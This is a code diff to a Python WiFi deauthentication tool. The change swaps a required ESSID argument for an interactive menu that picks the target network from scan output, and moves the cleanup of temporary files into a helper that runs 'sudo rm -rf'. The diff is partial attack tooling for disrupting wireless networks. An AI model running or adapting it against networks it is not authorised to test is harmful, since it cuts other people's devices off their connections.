@@ -1,4 +1,4 @@
-import subprocess, time, sys, argparse
+import subprocess, time, sys, argparse, inquirer, re
 
 
 
@@ -15,6 +15,18 @@ green = "\033[1;32m"
 yellow = "\033[1;33m"
 
 blue = "\033[1;34m"
+
+
+
+
+
+
+
+
+
+def deleteF():
+
+    subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt ./essidColt.py", shell = True, check = True )
 
 
 
@@ -60,13 +72,11 @@ def iwCh( channel, interface ):
 
         subprocess.run( cmd, shell = True, check = True )
 
-        print( f"{ green }Channel is set to { channel } on { interface }\n\n" )
-
     except:
 
         print( f"\n\n{ red }Getting error in setting channel on { interface }!\nLet him fish again!\n\n" )
 
-        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )
+        deleteF()
 
         sys.exit( 0 )
 
@@ -102,7 +112,7 @@ def kiddDeAuth( BSSID, interface ):
 
     except:
 
-        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )
+        deleteF()
 
         print( f"\n{ red }Stop sending DeAuth and files created by this script have been deleted!\n" )
 
@@ -116,9 +126,11 @@ def kiddDeAuth( BSSID, interface ):
 
 
 
-def air( IF, ESSID ):
+def air( IF ):
 
-    ESSID = ESSID.lower()
+    lst = []
+
+    rmLst = [ "AUTH", "ESSID", "PSK", "OPN", "0>" ]
 
     dic = {}
 
@@ -136,7 +148,35 @@ def air( IF, ESSID ):
 
     p.wait()
 
-    print( f"\n\n\n{ green }Program got fishbox\n\n" )
+    essidCmd = "sudo awk '{print $11, $12, $13, $14, $15, $16, $17, $18, $19 $20}' wifiInterF.txt | sort -u > essidColt.py"
+
+    subprocess.run( essidCmd, shell = True, check = True )
+
+    time.sleep( 0.2 )
+
+    with open( "essidColt.py", "r" ) as f:
+
+        for readL in f:
+
+            mdWrd = readL.strip()
+
+            for y in rmLst:
+
+                mdWrd = mdWrd.replace( y, "" )
+
+            lst.append( mdWrd.strip() )
+
+    clnData = [ re.sub( r'\x1b\[.*?K', '', x ) for x in lst ]
+
+    clnData1 = [ x.strip() for x in clnData if x.strip() != "" ]
+
+    resultLst = list( set( clnData1 ) )
+
+    wihOne = [ inquirer.List( "opt", message = "Choose a fish name", choices = resultLst ) ]
+
+    wifiName = inquirer.prompt( wihOne )[ "opt" ]
+
+    ESSID = wifiName.lower()
 
     cmd1 = "sudo grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $2 }' > wifiBssid.py" % ESSID
 
@@ -168,6 +208,8 @@ def air( IF, ESSID ):
 
         else:
 
+            print( f"\n\n\n{ green }🐟 { wifiName } fish on!\n\n" )
+
             dic[ "bssid" ] = bssid
 
             dic[ "channel" ] = chnel
@@ -176,7 +218,7 @@ def air( IF, ESSID ):
 
         print( f"\n\n{ red }wifiBssid or wifiChannel files are not found!\n\n" )
 
-        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )
+        deleteF()
 
         sys.exit( 0 )
 
@@ -198,11 +240,17 @@ def main():
 
     creOpt.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )
 
-    creOpt.add_argument( "-e", "--essid", type = str, required = True, help = "ESSID or wifi name" )
-
     opt = creOpt.parse_args()
 
-    air( opt.interface, opt.essid )
+    air( opt.interface )
+
+
+
+
+
+
+
+
 
 if __name__ == "__main__":
 
